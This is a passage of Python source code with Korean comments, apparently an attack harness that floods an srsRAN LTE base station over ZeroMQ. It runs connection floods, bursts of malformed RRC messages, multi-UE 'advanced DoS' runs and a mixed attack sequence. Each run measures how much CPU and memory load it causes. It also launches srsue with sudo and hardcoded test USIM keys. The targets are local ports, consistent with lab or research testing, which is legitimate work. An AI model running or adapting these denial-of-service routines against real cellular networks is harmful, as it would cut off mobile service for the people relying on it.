            total_attempts += 10  # 10개씩 시도
            total_success += success_count
            
            time.sleep(0.1)  # 100ms 간격
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(total_attempts, duration, total_success)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 공격적인 플러딩 완료 ===")
        self.log_message(f"총 {total_attempts}개 연결 시도")
        self.log_message(f"성공한 연결: {total_success}개")
        self.log_message(f"성공률: {(total_success/total_attempts*100):.1f}%" if total_attempts > 0 else "성공률: 0%")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)
    
    def advanced_dos_attack(self, duration=60):
        """고급 DoS 공격 (물리 계층 + 악성 메시지)"""
        self.setup_logging("advanced_dos", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== 고급 DoS 공격 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        total_messages = 0
        
        # 1. eNB 상태 확인 및 시작
        if not self.check_srsran_enb_status():
            self.log_message("eNB가 실행되지 않음. eNB를 시작합니다...")
            enb_process = self.start_srsran_enb()
            if not enb_process:
                self.log_message("eNB 시작 실패. 공격을 중단합니다.")
                return
        else:
            enb_process = None
        
        # 2. 물리 계층 연결 시뮬레이션
        ue_process = self.simulate_physical_layer_connection()
        
        # 2. 응답 모니터링 스레드 시작
        response_thread = threading.Thread(target=self.monitor_enb_responses, args=(duration,))
        response_thread.daemon = True
        response_thread.start()
        
        # 3. srsRAN 로그 모니터링 스레드 시작
        log_thread = threading.Thread(target=self.monitor_srsran_logs, args=(duration,))
        log_thread.daemon = True
        log_thread.start()
        
        while self.running and (time.time() - start_time) < duration:
            # 악성 메시지 전송
            sent_count = self.send_malformed_rrc_messages(50)
            total_messages += sent_count
            
            # 완전한 연결 시퀀스 수행
            if self.perform_complete_connection_sequence():
                total_messages += 1
            
            time.sleep(0.1)  # 100ms 간격
        
        # UE 프로세스 종료
        if ue_process:
            try:
                ue_process.terminate()
                ue_process.wait(timeout=5)
                print("UE 프로세스 종료됨")
            except:
                ue_process.kill()
                print("UE 프로세스 강제 종료됨")
        
        # eNB 프로세스 종료 (필요한 경우)
        if enb_process:
            try:
                enb_process.terminate()
                enb_process.wait(timeout=5)
                print("eNB 프로세스 종료됨")
            except:
                enb_process.kill()
                print("eNB 프로세스 강제 종료됨")
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(total_messages, duration, total_messages)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 고급 DoS 공격 완료 ===")
        self.log_message(f"총 {total_messages}개 메시지 전송")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)
    
    def real_srsran_attack(self, duration=60):
        """실제 srsRAN 환경에서의 공격"""
        self.setup_logging("real_srsran", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== 실제 srsRAN 환경 공격 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        total_messages = 0
        
        # 1. eNB 상태 확인 및 시작
        if not self.check_srsran_enb_status():
            self.log_message("eNB가 실행되지 않음. eNB를 시작합니다...")
            enb_process = self.start_srsran_enb()
            if not enb_process:
                self.log_message("eNB 시작 실패. 공격을 중단합니다.")
                return
        else:
            enb_process = None
        
        # 2. 다중 UE 프로세스 시작
        ue_processes = []
        for i in range(5):  # 5개 UE 동시 실행
            ue_process = self.simulate_physical_layer_connection()
            if ue_process:
                ue_processes.append(ue_process)
            time.sleep(1)  # UE 간 시작 간격
        
        # 3. 응답 모니터링 스레드 시작
        response_thread = threading.Thread(target=self.monitor_enb_responses, args=(duration,))
        response_thread.daemon = True
        response_thread.start()
        
        # 4. srsRAN 로그 모니터링 스레드 시작
        log_thread = threading.Thread(target=self.monitor_srsran_logs, args=(duration,))
        log_thread.daemon = True
        log_thread.start()
        
        while self.running and (time.time() - start_time) < duration:
            # 악성 메시지 전송
            sent_count = self.send_malformed_rrc_messages(100)
            total_messages += sent_count
            
            # 완전한 연결 시퀀스 수행
            if self.perform_complete_connection_sequence():
                total_messages += 1
            
            time.sleep(0.05)  # 50ms 간격 (더 빠른 공격)
        
        # UE 프로세스들 종료
        for i, ue_process in enumerate(ue_processes):
            try:
                ue_process.terminate()
                ue_process.wait(timeout=5)
                print(f"UE 프로세스 #{i+1} 종료됨")
            except:
                ue_process.kill()
                print(f"UE 프로세스 #{i+1} 강제 종료됨")
        
        # eNB 프로세스 종료 (필요한 경우)
        if enb_process:
            try:
                enb_process.terminate()
                enb_process.wait(timeout=5)
                print("eNB 프로세스 종료됨")
            except:
                enb_process.kill()
                print("eNB 프로세스 강제 종료됨")
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(total_messages, duration, total_messages)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 실제 srsRAN 환경 공격 완료 ===")
        self.log_message(f"총 {total_messages}개 메시지 전송")
        self.log_message(f"UE 프로세스: {len(ue_processes)}개")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)
    
    def test_basic_connection(self):
        """기본 연결 테스트 (공격 전)"""
        print(f"=== 기본 연결 테스트 시작 ===")
        
        # 1. eNB 상태 확인
        print(f"1. eNB 상태 확인...")
        if not self.check_srsran_enb_status():
            print("eNB가 실행되지 않음. eNB를 시작합니다...")
            enb_process = self.start_srsran_enb()
            if not enb_process:
                print("eNB 시작 실패")
                return False
        else:
            print("eNB가 정상 실행 중")
        
        # 2. 실제 srsRAN UE로 연결 테스트
        print(f"2. 실제 srsRAN UE로 연결 테스트...")
        ue_process = self.simulate_physical_layer_connection()
        if not ue_process:
            print("UE 시작 실패")
            return False
        
        # UE 프로세스가 이미 종료되었는지 확인
        if ue_process.poll() is not None:
            print("UE 프로세스가 즉시 종료됨")
            # UE 프로세스 종료
            try:
                ue_process.terminate()
                ue_process.wait(timeout=5)
                print("UE 프로세스 종료됨")
            except:
                ue_process.kill()
                print("UE 프로세스 강제 종료됨")
            return False
        
        # 3. 연결 상태 모니터링 (5초로 단축)
        print(f"3. 연결 상태 모니터링 (5초)...")
        start_time = time.time()
        connection_success = False
        
        while (time.time() - start_time) < 5:  # 5초로 단축
            # UE 프로세스 상태 확인
            if ue_process.poll() is not None:
                print("UE 프로세스가 종료됨")
                break
            
            # 간단한 메시지 전송 테스트
            try:
                socket = self.context.socket(zmq.PUSH)
                socket.connect(f"tcp://localhost:{self.target_port}")
                
                # 간단한 테스트 메시지
                test_message = b'\x00\x01\x02\x03'
                socket.send(test_message, zmq.NOBLOCK)
                socket.close()
                
                print(f"테스트 메시지 전송: {test_message.hex()}")
                
            except Exception as e:
                print(f"메시지 전송 실패: {e}")
            
            time.sleep(0.5)  # 0.5초 간격으로 단축
        
        # 4. UE 프로세스 종료
        try:
            ue_process.terminate()
            ue_process.wait(timeout=5)
            print("UE 프로세스 종료됨")
        except:
            ue_process.kill()
            print("UE 프로세스 강제 종료됨")
        
        print(f"=== 기본 연결 테스트 완료 ===")
        return connection_success
    
    def analyze_srsran_ue_connection(self):
        """실제 srsRAN UE 연결 과정 분석"""
        print(f"=== srsRAN UE 연결 과정 분석 ===")
        
        try:
            # 실제 srsRAN UE 실행 및 로그 캡처 (빈 설정 파일)
            ue_config = """
# srsRAN UE 설정 파일
# 모든 설정은 명령행 옵션으로 전달
"""
            
            # 설정 파일 저장
            config_file = "/tmp/ue_analysis.conf"
            with open(config_file, 'w') as f:
                f.write(ue_config)
            
            # srsRAN UE 프로세스 시작 (최소 옵션 + 상세 로그)
            cmd = [
                "sudo", "srsue",
                "--rf.device_name=zmq",
                "--rf.device_args=tx_port=tcp://localhost:2000,rx_port=tcp://localhost:2001,id=ue",
                "--rat.eutra.dl_earfcn=2680",
                "--usim.imsi=001010123456789",
                "--usim.k=00112233445566778899AABBCCDDEEFF",
                "--usim.op=63BFA50EE9864AAB33CC72DD78524B98",
                "--log.all_level=debug",
                "--log.rf_level=debug",
                config_file
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            print(f"UE 프로세스 시작: PID {process.pid}")
            print(f"설정 파일: {config_file}")
            
            # 연결 과정 로그 수집
            connection_logs = []
            start_time = time.time()
            last_output_time = start_time
            
            while (time.time() - start_time) < 60:  # 60초 동안 모니터링
                # 프로세스 상태 먼저 확인
                if process.poll() is not None:
                    print("UE 프로세스 종료됨")
                    # 종료 전 남은 출력 읽기
                    try:
                        remaining_stdout = process.stdout.read()
                        remaining_stderr = process.stderr.read()
                        if remaining_stdout:
                            timestamp = datetime.now().strftime('%H:%M:%S')
                            log_entry = f"[{timestamp}] STDOUT_REMAINING: {remaining_stdout.strip()}"
                            connection_logs.append(log_entry)
                            print(log_entry)
                        if remaining_stderr:
                            timestamp = datetime.now().strftime('%H:%M:%S')
                            log_entry = f"[{timestamp}] STDERR_REMAINING: {remaining_stderr.strip()}"
                            connection_logs.append(log_entry)
                            print(log_entry)
                    except:
                        pass
                    break
                
                # stdout과 stderr 모두 읽기 (논블로킹)
                try:
                    # stdout 읽기
                    line = process.stdout.readline()
                    if line:
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        log_entry = f"[{timestamp}] STDOUT: {line.strip()}"
                        connection_logs.append(log_entry)
                        print(log_entry)
                        last_output_time = time.time()  # 출력 시간 업데이트
                        
                        # 연결 성공 신호 확인
                        if "RRC Connected" in line or "Attach successful" in line:
                            print("✓ 연결 성공!")
                            break
                    
                    # stderr 읽기
                    stderr_line = process.stderr.readline()
                    if stderr_line:
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        log_entry = f"[{timestamp}] STDERR: {stderr_line.strip()}"
                        connection_logs.append(log_entry)
                        print(log_entry)
                        last_output_time = time.time()  # 출력 시간 업데이트
                        
                except Exception as e:
                    print(f"출력 읽기 오류: {e}")
                
                # 10초간 출력이 없으면 타임아웃
                if (time.time() - last_output_time) > 10:
                    print("10초간 출력이 없어 타임아웃됨")
                    break
                
                time.sleep(0.1)
            
            # 프로세스 종료
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                process.kill()
            
            # 로그 분석
            print(f"\n=== 연결 과정 분석 ===")
            print(f"총 로그 엔트리: {len(connection_logs)}개")
            
            # 중요한 로그만 필터링
            important_logs = []
            keywords = ["RRC", "RA", "preamble", "connection", "attach", "error", "fail"]
            
            for log in connection_logs:
                if any(keyword in log.lower() for keyword in keywords):
                    important_logs.append(log)
            
            print(f"중요한 로그: {len(important_logs)}개")
            for log in important_logs[:20]:  # 최대 20개만 출력
                print(f"  {log}")
            
            # 로그 파일 저장
            log_file = f"{self.log_dir}/srsran_ue_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
            with open(log_file, 'w', encoding='utf-8') as f:
                for log in connection_logs:
                    f.write(log + '\n')
            
            print(f"분석 로그 저장: {log_file}")
            
            return len(important_logs) > 0
            
        except Exception as e:
            print(f"srsRAN UE 연결 분석 실패: {e}")
            return False
    
    def run_all_attacks(self, duration=60):
        """모든 공격 유형을 순차적으로 실행하고 결과 비교"""
        self.setup_logging("all_attacks", duration)
        
        # 전체 공격 결과 저장용
        all_results = {
            'total_start_stats': None,
            'total_end_stats': None,
            'attack_results': {},
            'comparison': {}
        }
        
        self.log_message("=" * 60)
        self.log_message("=== 모든 공격 유형 순차 실행 시작 ===")
        self.log_message(f"각 공격 지속 시간: {duration}초")
        self.log_message("=" * 60)
        
        # 전체 시작 리소스 상태 캡처
        self.log_message("전체 공격 시작 전 리소스 상태 캡처 중...")
        all_results['total_start_stats'] = self.get_system_stats()
        total_start_time = datetime.now()
        
        if all_results['total_start_stats']:
            self.log_message(f"전체 시작 CPU: {all_results['total_start_stats']['cpu_percent']:.1f}%")
            self.log_message(f"전체 시작 메모리: {all_results['total_start_stats']['memory_percent']:.1f}% ({all_results['total_start_stats']['memory_used_gb']:.2f}GB)")
            self.log_message(f"전체 시작 네트워크 송신: {all_results['total_start_stats']['bytes_sent']:,} bytes")
            self.log_message(f"전체 시작 네트워크 수신: {all_results['total_start_stats']['bytes_recv']:,} bytes")
            self.log_message(f"전체 시작 srsRAN CPU: {all_results['total_start_stats']['srsran_cpu']:.1f}%")
            self.log_message(f"전체 시작 srsRAN 메모리: {all_results['total_start_stats']['srsran_memory']:.1f}%")
        
        # 1. RRC Connection Request 공격
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 1. RRC Connection Request 공격 시작 ===")
        self.log_message("=" * 60)
        
        rrc_start_stats = self.get_system_stats()
        rrc_start_time = datetime.now()
        
        self.running = True
        start_time = time.time()
        rrc_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            message = self.real_messages[2]  # RRC Connection Request
            if self.send_real_message(message, f"RRC Connection Request #{rrc_count+1}"):
                rrc_count += 1
            time.sleep(0.1)
        
        rrc_end_stats = self.get_system_stats()
        rrc_end_time = datetime.now()
        
        all_results['attack_results']['rrc'] = {
            'start_stats': rrc_start_stats,
            'end_stats': rrc_end_stats,
            'start_time': rrc_start_time,
            'end_time': rrc_end_time,
            'message_count': rrc_count,
            'duration': duration
        }
        
        self.log_message(f"RRC 공격 완료: {rrc_count}개 메시지 전송")
        self.log_message(f"RRC 공격 시간: {(rrc_end_time - rrc_start_time).total_seconds():.1f}초")
        
        # 공격 간 휴식
        self.log_message("\n공격 간 휴식 (5초)...")
        time.sleep(5)
        
        # 2. ZeroMQ 시퀀스 공격
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 2. ZeroMQ 시퀀스 공격 시작 ===")
        self.log_message("=" * 60)
        
        zmq_start_stats = self.get_system_stats()
        zmq_start_time = datetime.now()
        
        self.running = True
        start_time = time.time()
        zmq_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            self.send_zeromq_sequence()
            zmq_count += 1
            time.sleep(0.5)
        
        zmq_end_stats = self.get_system_stats()
        zmq_end_time = datetime.now()
        
        all_results['attack_results']['zeromq'] = {
            'start_stats': zmq_start_stats,
            'end_stats': zmq_end_stats,
            'start_time': zmq_start_time,
            'end_time': zmq_end_time,
            'message_count': zmq_count,
            'duration': duration
        }
        
        self.log_message(f"ZeroMQ 공격 완료: {zmq_count}개 시퀀스 전송")
        self.log_message(f"ZeroMQ 공격 시간: {(zmq_end_time - zmq_start_time).total_seconds():.1f}초")
        
        # 공격 간 휴식
        self.log_message("\n공격 간 휴식 (5초)...")
        time.sleep(5)
        
        # 3. 혼합 공격
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 3. 혼합 공격 시작 ===")
        self.log_message("=" * 60)
        
        mixed_start_stats = self.get_system_stats()
        mixed_start_time = datetime.now()
        
        self.running = True
        start_time = time.time()
        mixed_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            if random.random() < 0.5:
                message = self.real_messages[2]  # RRC Connection Request
                self.send_real_message(message, f"RRC Connection Request #{mixed_count+1}")
            else:
                self.send_zeromq_sequence()
            mixed_count += 1
            time.sleep(0.1)
        
        mixed_end_stats = self.get_system_stats()
        mixed_end_time = datetime.now()
        
        all_results['attack_results']['mixed'] = {
            'start_stats': mixed_start_stats,
            'end_stats': mixed_end_stats,
            'start_time': mixed_start_time,
            'end_time': mixed_end_time,
            'message_count': mixed_count,
            'duration': duration
        }
        
        self.log_message(f"혼합 공격 완료: {mixed_count}개 메시지/시퀀스 전송")
        self.log_message(f"혼합 공격 시간: {(mixed_end_time - mixed_start_time).total_seconds():.1f}초")
        
        # 전체 종료 리소스 상태 캡처
        self.log_message("\n" + "=" * 60)
        self.log_message("전체 공격 종료 후 리소스 상태 캡처 중...")
        all_results['total_end_stats'] = self.get_system_stats()
        total_end_time = datetime.now()
        
        if all_results['total_end_stats']:
            self.log_message(f"전체 종료 CPU: {all_results['total_end_stats']['cpu_percent']:.1f}%")
            self.log_message(f"전체 종료 메모리: {all_results['total_end_stats']['memory_percent']:.1f}% ({all_results['total_end_stats']['memory_used_gb']:.2f}GB)")
            self.log_message(f"전체 종료 네트워크 송신: {all_results['total_end_stats']['bytes_sent']:,} bytes")
            self.log_message(f"전체 종료 네트워크 수신: {all_results['total_end_stats']['bytes_recv']:,} bytes")
            self.log_message(f"전체 종료 srsRAN CPU: {all_results['total_end_stats']['srsran_cpu']:.1f}%")
            self.log_message(f"전체 종료 srsRAN 메모리: {all_results['total_end_stats']['srsran_memory']:.1f}%")
        
        # 모든 공격 결과 비교 분석
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 모든 공격 결과 비교 분석 ===")
        self.log_message("=" * 60)
        
        self.analyze_all_attack_results(all_results)
        
        # 전체 결과를 JSON 파일로 저장
        self.save_all_attack_results(all_results, total_start_time, total_end_time)
        
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 모든 공격 완료 ===")
        self.log_message(f"총 공격 시간: {(total_end_time - total_start_time).total_seconds():.1f}초")
        self.log_message(f"RRC 메시지: {rrc_count}개")
        self.log_message(f"ZeroMQ 시퀀스: {zmq_count}개")
        self.log_message(f"혼합 메시지: {mixed_count}개")
        self.log_message("=" * 60)
    
    def analyze_all_attack_results(self, all_results):
        """모든 공격 결과 비교 분석"""
        attack_names = {
            'rrc': 'RRC Connection Request',
            'zeromq': 'ZeroMQ 시퀀스',
            'mixed': '혼합 공격'
        }
        
        # 각 공격별 효과 분석
        for attack_type, attack_name in attack_names.items():
            if attack_type in all_results['attack_results']:
                result = all_results['attack_results'][attack_type]
                start_stats = result['start_stats']
                end_stats = result['end_stats']
                
                if start_stats and end_stats:
                    self.log_message(f"\n--- {attack_name} 공격 효과 ---")
                    
                    cpu_change = end_stats['cpu_percent'] - start_stats['cpu_percent']
                    memory_change = end_stats['memory_percent'] - start_stats['memory_percent']
                    srsran_cpu_change = end_stats['srsran_cpu'] - start_stats['srsran_cpu']
                    srsran_memory_change = end_stats['srsran_memory'] - start_stats['srsran_memory']
                    
                    self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
                    self.log_message(f"메모리 변화: {memory_change:+.1f}%")
                    self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
                    self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
                    
                    # 효과 평가
                    effectiveness = 0
                    if abs(cpu_change) > 5:
                        effectiveness += 1
                        self.log_message(f"✓ CPU 효과: {'증가' if cpu_change > 0 else '감소'} ({cpu_change:+.1f}%)")
                    if abs(memory_change) > 2:
                        effectiveness += 1
